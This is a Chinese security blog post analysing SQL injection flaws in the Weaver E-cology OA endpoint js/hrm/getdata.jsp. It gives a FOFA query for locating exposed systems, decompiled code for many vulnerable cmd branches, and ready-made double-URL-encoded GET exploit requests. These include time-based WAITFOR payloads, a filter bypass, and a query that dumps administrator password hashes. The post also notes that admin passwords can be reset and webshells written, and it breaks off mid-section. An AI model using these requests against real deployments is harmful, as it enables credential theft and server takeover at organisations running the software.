---
title: "泛微E-cology js/hrm/getdata.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/fanwei-ecology-getdata-sqli.html
---

# 泛微E-cology js/hrm/getdata.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/28 08:25
* 2587浏览
* [1评论](#comment)
* 6小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
E-cology是一款企业级协同办公自动化系统，主要为中大型企业提供全面的信息化解决方案。它以智能化、平台化和全程数字化为特点，旨在提升组织的协同办公效率和管理水平。由于E-cology将用户可控的参数拼接SQL语句，造成
[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
。攻击者可利用该
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
向数据库中写入数据，并利用Ole组件导出为Webshell，实现远程代码执行，进而获取服务器权限。

# 影响版本

补丁 < v10.75

# fofa语法

> `app="泛微-协同办公OA" || app="Weaver-OA"||app="泛微-OA（e-cology）"`

# 漏洞分析

js/hrm/getdata.jsp 内容如下

```
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
        request.setCharacterEncoding("UTF-8");
        response.setContentType("text/html; charset=UTF-8");
        response.setHeader("Cache-Control", "no-cache");
        java.io.PrintWriter pout = response.getWriter();
        try{
                pout.print(weaver.hrm.common.AjaxManager.getData(request, application));
        } catch (Exception e) {
                pout.print(e.toString());
        }
%>
```

跟进
`weaver.hrm.common.AjaxManager.getData`

```
public static String getData(HttpServletRequest var0, ServletContext var1) {
        return getData("", var0, var1);
    }

    public static String getData(String var0, HttpServletRequest var1, ServletContext var2) {
        String var3 = StringUtil.getURLDecode(var1.getParameter("cmd"));
        return StringUtil.isNull(var3) ? "" : proc(var0, var3, var1, var2);
    }
```

cmd 参数会在经过中间件默认解码后，还会再次解码，因此可以双重编码cmd参数的值，id等参数也是通用如此，且都是不区分大小写的。

跟进
*`proc`*
*方法*
，它才是重点

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/5a51a443ced24ef3b7bdd41e18d9edf9.webp)

根据
`cmd`
的值来进入不同的处理流程

## getUseDemand

当
`cmd=getUseDemand`
时，参数
`id`
会带入
`getUseDemand`
方法

```
private static String getUseDemand(String var0) {
    StringBuffer var1 = (new StringBuffer("select d.id,d.demandjobtitle,j.jobtitlename,d.demandkind,k.name as useKindName, ")).append("d.leastedulevel,l.name as levelName,d.demandnum,d.demandregdate,d.otherrequest,d.status from HrmUseDemand d ").append("left join HrmJobTitles j on d.demandjobtitle = j.id left join HrmUseKind k on d.demandkind = k.id ").append("left join HrmEducationLevel l on d.leastedulevel = l.id where d.id = ").append(var0);
    RS.executeSql(var1.toString());
    StringBuffer var2 = new StringBuffer("[");
```

被直接拼接进sql语句中，造成
[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
，其他方法也大同小异。

## getPlanIdByApplyId

```
if (var1.equalsIgnoreCase("getPlanIdByApplyId")) {
    HrmCareerApplyManager var7 = new HrmCareerApplyManager();
    var4.append(var7.findPlanIdByApplyId(var5));
......
public String findPlanIdByApplyId(Comparable var1) {
    return var1 != null && var1.toString().length() != 0 ? this.dao.findPlanIdByApplyId(var1) : "";
}
public String findPlanIdByApplyId(Comparable var1) {
    StringBuilder var2 = (new StringBuilder("select b.careerplanid from HrmCareerApply a ")).append("left join HrmCareerInvite b on a.jobtitle = b.id  ").append("where a.id = ").append(var1);
    this.rs.executeSql(var2.toString());
    String var3 = "";
```

## getSelectAllId

```
if (var1.equalsIgnoreCase("getSelectAllId")) {
    String var36 = StringUtil.getURLDecode(var2.getParameter("sql"));
    String var8 = StringUtil.getURLDecode(var2.getParameter("type"));
    var4.append(getSelectAllIds(var36, var8));
```

跟进
`getSelectAllIds`
方法

```
private static String getSelectAllIds(String var0, String var1) {
    String var2 = "";

    try {
        RS.executeSql(var0);
```

sql 参数解码后直接执行，可以执行任意sql语句。

## checkHrmReportTemplateName

```
if (var1.equals("checkHrmReportTemplateName")) {
    String var37 = StringUtil.getURLDecode(var2.getParameter("name"));
    if (var37.length() == 0) {
        var4.append("-1");
    } else {
        HrmRpSubTemplateManager var60 = new HrmRpSubTemplateManager();
        HashMap var9 = new HashMap();
        var9.put("name", var37);
        var9.put("author", StringUtil.getURLDecode(var2.getParameter("author")));
        List var10 = var60.find(var9);
        var4.append(var10 != null && var10.size() != 0 ? "1" : "0");
    }
```

跟进
`HrmRpSubTemplateManager`
方法的
`find`
方法

```
private List<HrmRpSubTemplate> find(Map<String, Comparable> var1, String var2) {
    ArrayList var3 = new ArrayList();
    StringBuffer var4 = (new StringBuffer(" SELECT ID,NAME,AUTHOR,CREATE_DATE,SCOPE,DELFLAG ")).append("FROM HRM_RP_SUB_TEMPLATE WHERE DELFLAG = 0 ");
    if (Tools.isNotNull(var2)) {
        var4.append(var2);
    } else if (var1 != null) {
        if (var1.containsKey("name")) {
            var4.append(" AND NAME = '").append(Tools.vString(var1.get("name"))).append("'");
        }

        if (var1.containsKey("like_name")) {
            var4.append(" AND NAME LIKE '%").append(Tools.vString(var1.get("name"))).append("%'");
        }

        if (var1.containsKey("author")) {
            var4.append(" AND AUTHOR = ").append(Tools.vString(var1.get("author")));
        }

        if (var1.containsKey("scope")) {
            var4.append(" AND SCOPE = '").append(Tools.vString(var1.get("scope"))).append("'");
        }

        if (var1.containsKey("like_scope")) {
            var4.append(" AND SCOPE LIKE '%").append(Tools.vString(var1.get("scope"))).append("%'");
        }
    }

    this.rs.executeSql(var4.toString());
```

## getHrmAward

```
if (var1.equalsIgnoreCase("getHrmAward")) {
    var4.append(getHrmAward(var5));
......
private static String getHrmAward(String var0) {
    RS.executeSql("select id,description,transact from HrmAwardType where id = " + var0);
    StringBuffer var1 = new StringBuffer("[");
    if (RS.next()) {
        var1.append("{").append("id:'").append(StringUtil.vString(RS.getString("id"))).append("',").append("description:'").append(StringUtil.vString(RS.getString("description"))).append("',").append("transact:'").append(StringUtil.vString(RS.getString("transact"))).append("'").append("}");
    }
```

## checkLoginId

```
if (var1.equalsIgnoreCase("checkLoginId")) {
    String var39 = StringUtil.getURLDecode(var2.getParameter("resourceid"));
    var4.append(checkLoginId(var5, var39));
private static String checkLoginId(String var0, String var1) {
    return checkLoginId(var0, var1, false);
}
private static String checkLoginId(String var0, String var1, boolean var2) {
    StringBuffer var3 = (new StringBuffer("select id,lastname,loginid,{fEmail},mobile,(select COUNT(id) from hrm_protection_question where user_id = {tName}.id and delflag = 0) as qCount from {tName} where loginid = '")).append(StringUtil.vString(var0)).append("' ");
    if (StringUtil.isNotNull(var1)) {
        var3.append(" and id != ").append(var1);
}
```

## getTransferData

```
if (var1.equalsIgnoreCase("getTransferData")) {
    String var41 = StringUtil.getURLDecode(var2.getParameter("isAll"));
    String var63 = StringUtil.getURLDecode(var2.getParameter("fromid"));
    String var80 = StringUtil.getURLDecode(var2.getParameter("idStr"));
    String var96 = StringUtil.getURLDecode(var2.getParameter("key"));
    String var11 = StringUtil.getURLDecode(var2.getParameter("jsonSql"));
    MJson var12 = new MJson(var11, true);
    String var13 = "";
    String var14 = "";

    while(var12.next()) {
        var13 = var12.getKey();
        if (var13.equalsIgnoreCase(var96)) {
            var14 = var12.getValue();
            break;
        }
    }

    if (var41.equals("0") && StringUtil.isNull(var80) && StringUtil.isNotNull(var14)) {
        RS.executeSql(var14);
public boolean next() {
        if (this.op >= this.length()) {
            return false;
        } else {
            try {
                this.thisObj = this.array.getJSONObject(this.op);
                if (this.sKey) {
                    this.thisKey = this.thisObj.getString("key");
                    this.thisValue = this.thisObj.getString("value");
                }
            } catch (JSONException var2) {
                Tools.println(var2);
            }

            ++this.op;
            return true;
        }
    }
```

当满足以下条件时

* `isAll=0`
* idStr不传或空值
* key的值为 jsonsql里的键名，且var14不为null时

直接执行 var14 的sql语句，即jsonsql里value的值，因此一个符合条件的jsonsql大致如下

```
{"json":[{"key":"sql","value":"IF (1=1) WAITFOR DELAY'0:0:5'"}]}
```

需要注意
`executeSql`
方法里对sql语句是有检查的，不能含有特殊字符如
`--`
`;`
这些，同时会替换单引号内的内容为空（包括两个单引号本身）

### executeSql 过滤检查

```
try {
    try {
        String var26 = var1;
        if (this.checksql) {
            try {
                var26 = Util.replace(var26, "'[^']*'", "", 0);
            } catch (Exception var20) {
                this.writeLog("regex parse error:" + var1);
            }

            if (var26.indexOf(";") > -1 || var26.indexOf("--") > -1) {
                this.writeLog("illegal sql statement:" + var1);
                boolean var27 = false;
                return var27;
            }
        }

        Statement var5 = this.conn.createStatement();
        Date var6 = new Date();
        var5.execute(var1);
        ResultSet var7 = var5.getResultSet();
```

但是在变量使用上，又没有使用替换后的 var26，通过调试可以看到还是使用的var1进行执行命令,但是不能包含上面的两个特殊字符，否则直接就返回 false了

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/bfa9bec832b649b8bfdddf39afa08d6c.webp)

当
`isAll`
不等于0时，且无论参数
`id`
等于多少，都会进入
`getAllNum`
方法

```
if (var41.equals("1")) {
                var80 = "";
            }

            if (var5.equalsIgnoreCase("T203")) {
                HrmResourceManager var15 = new HrmResourceManager();
                var4.append(var15.getAllNum("department", var5, var63, var80));
            } else if (var5.equalsIgnoreCase("C302")) {
                HrmPostManager var147 = new HrmPostManager();
                var4.append(var147.getAllNum("subcompany", var5, var63, var80));
            }
```

getAllNum

```
public int getAllNum(String var1, String var2, String var3, String var4) {
        var4 = Tools.vString(var4);
        int var5 = 0;
        StringBuffer var6 = new StringBuffer();
        if (var1.equalsIgnoreCase(AuthorityType.DEPARTMENT.getName())) {
            var6.append("select count(id) from hrmresource where departmentid = ").append(var3).append(" and status in (0,1,2,3)");
            if (Tools.isNotNull(var4)) {
                var6.append(" and jobtitle in (").append(var4).append(")");
            } else {
                var6.append(" and jobtitle in (select id from HrmJobTitles where jobdepartmentid = ").append(var3).append(")");
            }

            this.rs.executeSql(var6.toString());
            var5 = this.rs.next() ? this.rs.getInt(1) : 0;
        }

        return var5;
    }
```

fromid ==> var64 ==> var3 被直接拼接进SQL语句中，会造成SQL注入漏洞，idStr 如果存在，同样也是直接拼接进SQL语句中，也存在
[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
。

## checkFromid

```
if (var1.equalsIgnoreCase("checkFromid")) {
    HashMap var42 = new HashMap();
    var42.put("fromid", var5);
    var42.put("pStatus", "0");
    List var64 = (new HrmTransferLogManager()).find(var42);
    var4.append(var64 != null && var64.size() != 0 ? "1" : "0");

public List<HrmTransferLog> find(Map<String, Comparable> var1) {
    ArrayList var2 = new ArrayList();
    StringBuffer var3 = (new StringBuffer()).append(" select t.id,t.type,t.fromid,t.toid,t.p_type,t.p_begin_date,t.p_finish_date,").append(" t.p_member,t.p_ip,t.p_status,t.is_read,t.read_date,t.p_time,").append(" t.all_num").append(" from hrm_transfer_log t").append(" where  1 = 1");
    if (var1 != null) {
        if (var1.containsKey("id")) {
            var3.append(" and t.id = ").append(Tools.vString(var1.get("id")));
        }
        ......
        if (var1.containsKey("fromid")) {
            var3.append(" and t.fromid = '").append(Tools.vString(var1.get("fromid"))).append("'");
        }
        ......
        else {
        var3.append(" order by t.id ").append(Tools.vString(var1.get("sqlsortway")).length() > 0 ? Tools.vString(var1.get("sqlsortway")) : "desc");
            }
        }

        WeaverConnection var4 = null;
        Statement var5 = null;
        ResultSet var6 = null;

        try {
            var4 = ConnectionPool.getInstance().getConnection();
            var5 = var4.createStatement();
            var6 = var5.executeQuery(var3.toString());
            Object var7 = null;
```

## verifyPswd

```
if (var1.equalsIgnoreCase("verifyPswd")) {
            String var45 = Util.getEncrypt(StringUtil.getURLDecode(var2.getParameter("pswd")));
            HashMap var67 = new HashMap();
            var67.put("id", var5);
            var67.put("password", var45);
            boolean var82 = (new weaver.hrm.passwordprotection.manager.HrmResourceManager()).get(var67) != null;

......
public List<HrmResourceManager> find(Map<String, Comparable> var1) {
    ArrayList var2 = new ArrayList();
    StringBuffer var3 = (new StringBuffer()).append(" select t.id,t.loginid,t.password,t.firstname,t.lastname,t.systemlanguage,t.seclevel,").append(" t.status,t.description,t.creator,t.dactylogram,t.assistantdactylogram,t.subcompanyids").append(" from HrmResourceManager t").append(" where  1 = 1");
    if (var1 != null) {
        if (var1.containsKey("id")) {
            var3.append(" and t.id = ").append(StringUtil.vString(var1.get("id")));
        }
        ......
this.rs.executeSql(var3.toString());
```

需要注意
`executeSql`
方法对特殊字符的过滤和检查，参考上面
`getTransferData`
方法部分的分析。

## userOffline

```
if (var1.equalsIgnoreCase("userOffline")) {
    String var47 = StringUtil.getURLDecode(var2.getParameter("uid"));
    (new LicenseCheckLogin()).userOffline(var47);
......
public void updateOnlinFlag(String var1) {
    this.rs.executeSql("update HrmResource_online set online_flag = '0' where user_id =" + var1);
}

public void userOffline(String var1) {
    ArrayList var2 = (ArrayList)this.staticobj.getObject("onlineuserids");
    HashMap var3 = (HashMap)this.staticobj.getObject("onlineuserips");
    if (var2 != null && var3 != null) {
        int var4 = var2.indexOf(var1);
        if (var4 != -1) {
            var2.remove(var4);
            if (var3.containsKey(var1)) {
                var3.remove(var1);
            }
        }
    }

    this.updateOnlinFlag(var1);
    this.rs.writeLog("用户" + var1 + "被踢出系统（" + DateUtil.getDateTime(new Date()) + "）~");
}
```

## forgotPasswordCheck

```
if (var1.equalsIgnoreCase("forgotPasswordCheck")) {
    String var48 = StringUtil.getURLDecode(var2.getParameter("loginid"));
    var4.append(checkLoginId(var48, (String)null, true));
......
private static String checkLoginId(String var0, String var1, boolean var2) {
    StringBuffer var3 = (new StringBuffer("select id,lastname,loginid,{fEmail},mobile,(select COUNT(id) from hrm_protection_question where user_id = {tName}.id and delflag = 0) as qCount from {tName} where loginid = '")).append(StringUtil.vString(var0)).append("' ");
    if (StringUtil.isNotNull(var1)) {
        var3.append(" and id != ").append(var1);
    }
```

## sendSMS

```
if (var1.equalsIgnoreCase("sendSMS")) {
    String var49 = StringUtil.getURLDecode(var2.getParameter("receiver"));
    String var69 = StringUtil.getURLDecode(var2.getParameter("content"));
    String var87 = StringUtil.getURLDecode(var2.getParameter("loginid"));
    String var100 = "";
    boolean var113 = false;
    HrmPasswordProtectionSetManager var123 = new HrmPasswordProtectionSetManager();
    if (StringUtil.isNotNull(var5) && !var5.equals("0")) {
        var100 = var123.getRandomPassword();
        var69 = StringUtil.replace("E-cology登录随机密码：{pswd}，请登录后及时修改！", "{pswd}", var100);
        var113 = true;
    }

    boolean var134 = MessageUtil.sendSMS(var49, var69);
    if (var134 && var113) {
        var123.changePassword(var5, var87, var100);
    }

    var4.append(var134);
```

changePassword

```
public void changePassword(String var1, String var2, String var3) {
    var3 = Util.getEncrypt(Util.toHtml5(StringUtil.vString(var3)));
    if (!StringUtil.isNull(var1) || !StringUtil.isNull(var2)) {
        StringBuffer var4 = (new StringBuffer("update " + AjaxManager.getData(var2, "getTResourceName;HrmResource") + " set password = '")).append(var3).append("' where 1 = 1 ");
        if (StringUtil.isNotNull(var1)) {
            var4.append(" and id = ").append(var1);
        }

        if (StringUtil.isNotNull(var2)) {
            var4.append(" and loginid = '").append(var2).append("'");
        }

        this.rs.executeSql(var4.toString());
    }
```

## sendEmail

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/21b4d782911045a69a98642c6fcf6950.webp)

## verifyQuestion

```
if (var1.equalsIgnoreCase("verifyQuestion")) {
    String var51 = StringUtil.getURLDecode(var2.getParameter("loginid"));
    String var71 = StringUtil.getURLDecode(var2.getParameter("qid"));
    String var89 = StringUtil.getURLDecode(var2.getParameter("answer"));
    HrmPasswordProtectionQuestionManager var102 = new HrmPasswordProtectionQuestionManager();
    HashMap var115 = new HashMap();
    var115.put("sql_userId", "and t.user_id in (select id from " + getData(var51, "getTResourceName;HrmResource") + " where loginid = '" + var51 + "') ");
    var115.put("id", var71);
    var115.put("answer", var89);
    List var125 = var102.find(var115);
public List<HrmPasswordProtectionQuestion> find(Map<String, Comparable> var1) {
    ArrayList var2 = new ArrayList();
    StringBuffer var3 = (new StringBuffer()).append(" select t.id,t.user_id,t.question,t.answer,t.delflag").append(" from hrm_protection_question t").append(" where  t.delflag = 0");
    if (var1 != null) {
        if (var1.containsKey("id")) {
            var3.append(" and t.id = ").append(StringUtil.vString(var1.get("id")));
        }
......
if (var1.containsKey("sqlorderby")) {
                var3.append(" order by " + StringUtil.vString(var1.get("sqlorderby")));
            } else {
                var3.append(" order by t.id ").append(StringUtil.vString(var1.get("sqlsortway")).length() > 0 ? StringUtil.vString(var1.get("sqlsortway")) : "desc");
            }
        }

this.rs.executeSql(var3.toString());
```

## saveNewPassword

> 可通过注入修改管理员密码

```
if (var1.equalsIgnoreCase("saveNewPassword")) {
    String var52 = StringUtil.getURLDecode(var2.getParameter("loginid"));
    String var72 = StringUtil.getURLDecode(var2.getParameter("newpswd"));
    (new HrmPasswordProtectionSetManager()).changePassword(var5, var52, var72);
public void changePassword(String var1, String var2, String var3) {
    var3 = Util.getEncrypt(Util.toHtml5(StringUtil.vString(var3)));
    if (!StringUtil.isNull(var1) || !StringUtil.isNull(var2)) {
        StringBuffer var4 = (new StringBuffer("update " + AjaxManager.getData(var2, "getTResourceName;HrmResource") + " set password = '")).append(var3).append("' where 1 = 1 ");
        if (StringUtil.isNotNull(var1)) {
            var4.append(" and id = ").append(var1);
        }

        if (StringUtil.isNotNull(var2)) {
            var4.append(" and loginid = '").append(var2).append("'");
        }

        this.rs.executeSql(var4.toString());
    }
}
```

## saveAdminUsbSet

```
if (var1.equalsIgnoreCase("saveAdminUsbSet")) {
    String var54 = StringUtil.getURLDecode(var2.getParameter("arg0"));
    String var74 = StringUtil.getURLDecode(var2.getParameter("arg1"));
    String var90 = StringUtil.getURLDecode(var2.getParameter("arg2"));
    String var104 = StringUtil.getURLDecode(var2.getParameter("arg3"));
    String var117 = StringUtil.getURLDecode(var2.getParameter("arg4"));
    String var127 = StringUtil.getURLDecode(var2.getParameter("arg5"));
    RS.executeSql("UPDATE HRMRESOURCEMANAGER SET" + " userUsbType = '" + var74 + "'," + " usbstate = '" + var90 + "'," + " mobile = '" + var104 + "'," + " serial = '" + var117 + "'," + " tokenKey = '" + var127 + "'" + " where id = " + var54);
```

## savect

```
if (var1.equalsIgnoreCase("savect")) {
    String var55 = StringUtil.getURLDecode(var2.getParameter("arg0"));
    String var75 = StringUtil.getURLDecode(var2.getParameter("arg1"));
    String var91 = StringUtil.getURLDecode(var2.getParameter("arg2"));
    String var105 = StringUtil.getURLDecode(var2.getParameter("arg3"));
    HrmChartSetManager var118 = new HrmChartSetManager();
    HrmChartSet var128 = (HrmChartSet)var118.get(var55);
public HrmChartSet get(Comparable var1) {
    HrmChartSet var2 = null;
    HashMap var3 = new HashMap();
    var3.put("id", var1);
    List var4 = this.find(var3);
    if (var4 != null && var4.size() > 0) {
        var2 = (HrmChartSet)var4.get(0);
    }

    return var2;
}
public List<HrmChartSet> find(Map<String, Comparable> var1) {
    ArrayList var2 = new ArrayList();
    StringBuffer var3 = (new StringBuffer()).append(" select t.id,t.is_sys,t.author,t.show_type,t.show_num,t.show_mode").append(" from hrm_chart_set t").append(" where  1 = 1");
    if (var1 != null) {
        if (var1.containsKey("id")) {
            var3.append(" and t.id = ").append(StringUtil.vString(var1.get("id")));
        }
......
 else {
                var3.append(" order by t.id ").append(StringUtil.vString(var1.get("sqlsortway")).length() > 0 ? StringUtil.vString(var1.get("sqlsortway")) : "desc");
            }
        }

this.rs.executeSql(var3.toString());
```

## initChart

```
if (var1.equalsIgnoreCase("initChart")) {
            User var56 = (User)var2.getSession(true).getAttribute("weaver_user@bean");
            String var76 = StringUtil.getURLDecode(var2.getParameter("arg0"));
            int var92 = StringUtil.parseToInt(StringUtil.getURLDecode(var2.getParameter("arg1")), 1);
            String var106 = StringUtil.getURLDecode(var2.getParameter("arg2"));
            boolean var119 = Boolean.valueOf(StringUtil.getURLDecode(var2.getParameter("arg3")));
            String var129 = StringUtil.getURLDecode(var2.getParameter("arg4"));
            String var138 = StringUtil.getURLDecode(var2.getParameter("arg5"));
            String var145 = StringUtil.getURLDecode(var2.getParameter("arg6"));
            String var151 = StringUtil.getURLDecode(var2.getParameter("arg7"));
            String var154 = StringUtil.getURLDecode(var2.getParameter("arg8"));
            String var156 = StringUtil.getURLDecode(var2.getParameter("arg9"));
            String var158 = StringUtil.getURLDecode(var2.getParameter("arg10"));
            String var19 = StringUtil.getURLDecode(var2.getParameter("arg11"));
            HrmCompanyVirtualManager var20 = new HrmCompanyVirtualManager();
            HrmCompanyVirtual var21 = null;
            if (!var119) {
                var21 = (HrmCompanyVirtual)var20.get(var76);
public HrmCompanyVirtual get(Comparable var1) {
        HrmCompanyVirtual var2 = null;
        HashMap var3 = new HashMap();
        var3.put("id", var1);
        List var4 = this.find(var3);
        if (var4 != null && var4.size() > 0) {
            var2 = (HrmCompanyVirtual)var4.get(0);
        }

        return var2;
    }
public List<HrmCompanyVirtual> find(Map<String, Comparable> var1) {
        ArrayList var2 = new ArrayList();
        StringBuffer var3 = (new StringBuffer()).append(" select t.id,t.companyname,t.companycode,t.companydesc,t.canceled,t.showorder,t.virtualType,").append(" t.virtualtypedesc").append(" from HrmCompanyVirtual t").append(" where  1 = 1");
        if (var1 != null) {
            if (var1.containsKey("id")) {
                var3.append(" and t.id = ").append(StringUtil.vString(var1.get("id")));
            }

            if (var1.containsKey("begin_id")) {
                var3.append(" and t.id >= ").append(StringUtil.vString(var1.get("begin_id")));
            }
```

## checkBeforeShowMobileSignData

```
if (var1.equalsIgnoreCase("checkBeforeShowMobileSignData")) {
    StringBuffer var59 = new StringBuffer();
    List var79 = Arrays.asList((new weaver.hrm.passwordprotection.manager.HrmResourceManager()).getSubResourceIds(var6).split(","));
    List var95 = Arrays.asList(var5.split(","));
public String getSubResourceIds(String var1) {
    StringBuffer var2 = new StringBuffer();
    StringBuffer var3 = (new StringBuffer("WITH allSub(ID) AS ( SELECT ID FROM HrmResource WHERE managerid = ")).append(var1).append(" and id != managerid UNION ALL SELECT a.ID FROM HrmResource a, allSub b WHERE a.managerid = b.ID ) SELECT a.ID FROM allSub a LEFT JOIN HrmResource b ON a.ID = b.ID WHERE b.status in (0,1,2,3)");
    this.rs.executeSql(var3.toString());
```

# 漏洞复现

> 双重url编码
> `1 WAITFOR DELAY '0:0:3'`
>
> %25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37
>
> 如果过滤了 单引号 百分号这些，可以使用 declare 来绕过
>
> `declare @delaytime nvarchar(100)/**/set @delaytime=concat(char(48),char(58),char(48),char(58),char(53))/**/waitfor delay @delaytime`

## getUseDemand

```
GET /js/hrm/getdata.jsp?cmd=getUseDemand&id=%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## getPlanIdByApplyId

```
GET /js/hrm/getdata.jsp?cmd=getPlanIdByApplyId&id=%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## getSelectAllId

> select password as id from HrmResourceManager

```
GET /js/hrm/getdata.jsp?cmd=%25%36%37%25%36%35%25%37%34%25%35%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%34%31%25%36%63%25%36%63%25%34%39%25%36%34&sql=%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%32%30%25%36%31%25%37%33%25%32%30%25%36%39%25%36%34%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%34%38%25%37%32%25%36%64%25%35%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%37%32 HTTP/1.1
Host: ecology.mrxn.net
```

## checkHrmReportTemplateName

```
GET /js/hrm/getdata.jsp?cmd=%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%34%38%25%37%32%25%36%64%25%35%32%25%36%35%25%37%30%25%36%66%25%37%32%25%37%34%25%35%34%25%36%35%25%36%64%25%37%30%25%36%63%25%36%31%25%37%34%25%36%35%25%34%65%25%36%31%25%36%64%25%36%35&name=%25%33%31&author=%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## getHrmAward

```
GET /js/hrm/getdata.jsp?cmd=%25%36%37%25%36%35%25%37%34%25%34%38%25%37%32%25%36%64%25%34%31%25%37%37%25%36%31%25%37%32%25%36%34&id=%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## checkLoginId

id

```
GET /js/hrm/getdata.jsp?cmd=%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%34%63%25%36%66%25%36%37%25%36%39%25%36%65%25%34%39%25%36%34&id=%25%33%31%25%32%37%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33 HTTP/1.1
Host: ecology.mrxn.net
```

resourceid

```
GET /js/hrm/getdata.jsp?cmd=%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%34%63%25%36%66%25%36%37%25%36%39%25%36%65%25%34%39%25%36%34&resourceid=%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## getTransferData

```
GET /js/hrm/getdata.jsp?cmd=%25%36%37%25%36%35%25%37%34%25%35%34%25%37%32%25%36%31%25%36%65%25%37%33%25%36%36%25%36%35%25%37%32%25%34%34%25%36%31%25%37%34%25%36%31&isAll=0&idStr=&key=sql&jsonSql=%25%37%62%25%32%32%25%36%61%25%37%33%25%36%66%25%36%65%25%32%32%25%33%61%25%35%62%25%37%62%25%32%32%25%36%62%25%36%35%25%37%39%25%32%32%25%33%61%25%32%32%25%37%33%25%37%31%25%36%63%25%32%32%25%32%63%25%32%32%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%32%25%33%61%25%32%32%25%34%39%25%34%36%25%32%30%25%32%38%25%33%31%25%33%64%25%33%31%25%32%39%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%35%25%32%37%25%32%32%25%37%64%25%35%64%25%37%64&fromid= HTTP/1.1
Host: ecology.mrxn.net
```

## checkFromid

```
GET /js/hrm/getdata.jsp?cmd=%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%34%36%25%37%32%25%36%66%25%36%64%25%36%39%25%36%34&id=%25%33%31%25%32%37%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37%25%32%64%25%32%64 HTTP/1.1
Host: ecology.mrxn.net
```

## verifyPswd

> 有过滤，采用笛卡尔乘积的方式来测试
>
> 3倍笛卡尔乘积与2倍笛卡尔乘积的时间差
>
> id={{url({{url(1 and (SELECT CASE WHEN 1=1 THEN (SELECT COUNT(\*) FROM sys.all\_objects a, sys.all\_objects b, sys.all\_objects c) ELSE 1 END) > 0 )}})}}

```
